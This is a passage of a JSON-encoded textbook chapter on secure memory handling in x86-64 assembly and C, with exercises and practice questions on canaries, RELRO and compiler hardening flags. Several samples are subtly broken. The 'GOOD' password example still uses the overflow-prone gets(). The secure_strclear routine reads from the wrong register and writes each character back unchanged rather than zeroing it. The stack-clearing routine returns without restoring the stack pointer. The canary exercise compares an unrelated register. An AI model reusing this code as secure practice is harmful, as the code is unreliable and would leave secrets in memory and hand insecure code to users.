        "title": "44.4.2 Memory Zeroization",
        "content": "Always clear sensitive data after use:",
        "codeSnippets": [
          {
            "title": "Memory Zeroization — example",
            "language": "nasm",
            "code": "; Secure memset: Clear buffer with volatile to prevent optimization\nsection .text\n; rdi=buffer, rsi=size\nsecure_zero:\n    push rax\n    push rcx\n    push rdi\n\nmov rcx, rsi\n    xor al, al\n\n.loop:\n    mov byte [rdi], al\n    ; Compiler barrier to prevent optimization\n    ; (In real code, use volatile or inline asm)\n    inc rdi\n    dec rcx\n    jnz .loop\n\npop rdi\n    pop rcx\n    pop rax\n    ret"
          }
        ]
      },
      {
        "id": "sec-44-4-3",
        "title": "44.4.3 Stack Variable Clearing",
        "content": "Clear local variables before return:\n\nleave",
        "codeSnippets": [
          {
            "title": "Stack Variable Clearing — example",
            "language": "nasm",
            "code": "function:\n    push rbp\n    mov rbp, rsp\n    sub rsp, 64         ; Local variables\n\n; ... function body ...\n\n; Clear sensitive local variables\n    lea rdi, [rbp-64]\n    mov rsi, 64\n    call secure_zero\n\n    ret"
          }
        ]
      },
      {
        "id": "sec-44-4-4",
        "title": "44.4.4 Password Handling",
        "content": "",
        "codeSnippets": [
          {
            "title": "Password Handling — example",
            "language": "c",
            "code": "// BAD: Password stays in memory\nchar password[256];\ngets(password);\nauthenticate(password);\n// Password still in memory!\n\n// GOOD: Clear after use\nchar password[256];\ngets(password);\nauthenticate(password);\nexplicit_bzero(password, sizeof(password));  // Clear"
          }
        ]
      },
      {
        "id": "sec-44-4-5",
        "title": "44.4.5 Cryptographic Key Handling",
        "content": "• Use mlock() to prevent swapping to disk\n• Clear keys immediately after use\n• Consider using kernel keyring\n• Use constant-time operations to prevent timing attacks"
      },
      {
        "id": "sec-44-4-6",
        "title": "44.4.6 Compiler Optimization Issues",
        "content": "Compilers may optimize away zeroization:",
        "codeSnippets": [
          {
            "title": "Compiler Optimization Issues — example",
            "language": "nasm",
            "code": "// May be optimized away!\nmemset(sensitive_data, 0, size);"
          },
          {
            "title": "Compiler Optimization Issues — example",
            "language": "c",
            "code": "// Use volatile to prevent optimization\nvolatile char *p = (volatile char *)sensitive_data;\nfor (size_t i = 0; i < size; i++) {\n    p[i] = 0;\n}"
          },
          {
            "title": "Compiler Optimization Issues — example",
            "language": "nasm",
            "code": "// Or use explicit_bzero (POSIX)\nexplicit_bzero(sensitive_data, size);"
          }
        ]
      },
      {
        "id": "sec-44-4-7",
        "title": "44.4.7 Memory Protection Techniques",
        "content": "",
        "tableData": {
          "headers": [
            "Technique",
            "Purpose"
          ],
          "rows": [
            [
              "mlock()",
              "Prevent swapping to disk"
            ],
            [
              "mprotect()",
              "Control page permissions"
            ],
            [
              "guard pages",
              "Detect stack overflows"
            ],
            [
              "ASLR",
              "Randomize memory layout"
            ],
            [
              "Stack canaries",
              "Detect stack corruption"
            ]
          ]
        }
      },
      {
        "id": "sec-44-4-8",
        "title": "44.4.8 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Secure Memory Operations",
            "code": "; secure_memzero: Volatile zeroization\n; rdi=buffer, rsi=size\nsection .text\nglobal secure_memzero\nsecure_memzero:\n    push rax\n    push rcx\n    push rdi\n    \n    mov rcx, rsi\n    xor al, al\n    \n.loop:\n    ; Use volatile write (prevent optimization)\n    mov byte [rdi], al\n    ; Memory barrier\n    mfence\n    inc rdi\n    dec rcx\n    jnz .loop\n    \n    pop rdi\n    pop rcx\n    pop rax\n    ret\n\n; Secure string clear (for passwords)\n; rdi=string\nsection .text\nsecure_strclear:\n    push rax\n    push rdi\n    \n.loop:\n    lodsb               ; AL = [RSI], RSI++\n    test al, al\n    jz .done\n    stosb               ; Write zero\n    jmp .loop\n    \n.done:\n    ; Ensure null terminator cleared\n    mov byte [rdi], 0\n    \n    pop rdi\n    pop rax\n    ret"
          }
        ]
      }
    ],
    "exercises": [
      {
        "id": "ex-44-1",
        "title": "Exercise 44.1: Manual Stack Canary Implementation",
        "description": "Read a random 64-bit word with sys_getrandom (318), store at [rbp-8], and verify before return.",
        "solution": "sub rsp, 8\nmov rax, 318; mov rdi, rsp; mov rsi, 8; xor rdx, rdx; syscall\nmov rax, [rsp]; add rsp, 8\n; store in stack frame\nmov [rbp-8], rax\n; ... body ...\nmov rcx, [rbp-8]; cmp rax, rcx; jne .abort",
        "solutionLanguage": "nasm"
      },
      {
        "id": "ex-44-2",
        "title": "Exercise 44.2: Bounds-Checked Memory Copy",
        "description": "Implement a memory copy function that validates destination buffer size.",
        "solution": "Function takes dest, src, copy_size, dest_size. Check if copy_size > dest_size. If overflow, return error. Otherwise, copy bytes with loop and return success."
      },
      {
        "id": "ex-44-3",
        "title": "Exercise 44.3: Integer Overflow Check",
        "description": "Write a function that checks if multiplying two 64-bit integers would overflow.",
        "solution": "Use mul instruction which stores result in RDX:RAX. If RDX != 0, overflow occurred. Or use: if (a > UINT64_MAX / b) overflow."
      },
      {
        "id": "ex-44-4",
        "title": "Exercise 44.4: Secure Password Buffer",
        "description": "Implement a secure password buffer that clears itself after use.",
        "solution": "Allocate buffer on stack. After password is used, call secure_memzero to clear. Use volatile writes to prevent compiler optimization from removing the clear operation."
      }
    ],
    "practiceQuestions": [
      {
        "question": "What is Full RELRO and how does it prevent exploitation?",
        "answer": "Full RELRO (Relocation Read-Only) resolves all dynamic symbols at program startup and marks the Global Offset Table (GOT) as completely read-only. This prevents attackers from overwriting GOT entries to redirect function calls, which is a common exploitation technique for hijacking control flow."
      },
      {
        "question": "Why is bounds checking essential for secure code?",
        "answer": "Bounds checking prevents buffer overflows by verifying that memory writes stay within allocated buffer boundaries. Without bounds checking, writing past a buffer can overwrite adjacent memory, including return addresses, function pointers, or other critical data, leading to code execution or crashes."
      },
      {
        "question": "How do stack canaries detect buffer overflows?",
        "answer": "Stack canaries place a random value before the saved return address. Before returning, the function verifies the canary value matches the original. If an overflow overwrites the canary, the check fails and the program terminates, preventing exploitation of the corrupted return address."
      },
      {
        "question": "What is integer overflow and why is it dangerous?",
        "answer": "Integer overflow occurs when an arithmetic operation produces a value outside the representable range. It is dangerous because it can cause: buffer size underallocation (leading to overflow), bypass of security checks (if size check uses small type), or logic errors that enable exploitation."
      },
      {
        "question": "Why must sensitive data be cleared from memory?",
        "answer": "Sensitive data (passwords, cryptographic keys) must be cleared to prevent: memory dump analysis (extracting secrets from core dumps), swap file exposure (data written to disk), cold boot attacks (reading DRAM contents), and memory disclosure vulnerabilities (reading process memory)."
      },
      {
        "question": "What compiler flags improve security?",
        "answer": "Key flags: -fstack-protector-strong (stack canaries), -z noexecstack (NX), -z relro -z now (Full RELRO), -pie -fPIE (ASLR), -D_FORTIFY_SOURCE=2 (buffer overflow checks). These provide defense-in-depth against common vulnerabilities."
      }
    ],
    "summary": [
      "Bounds checking prevents buffer overflows and out-of-bounds access.",
      "Arithmetic overflow detection uses jo/jc flags or compiler built-ins.",
      "Stack canaries detect stack smashing before return.",
      "RELRO protects GOT from modification.",
      "Secure memory handling clears sensitive data after use.",
      "Compiler flags provide automatic security protections.",
      "Defense in depth uses multiple security layers.",
      "Secure coding is essential for reliable software."
    ]
  }
];
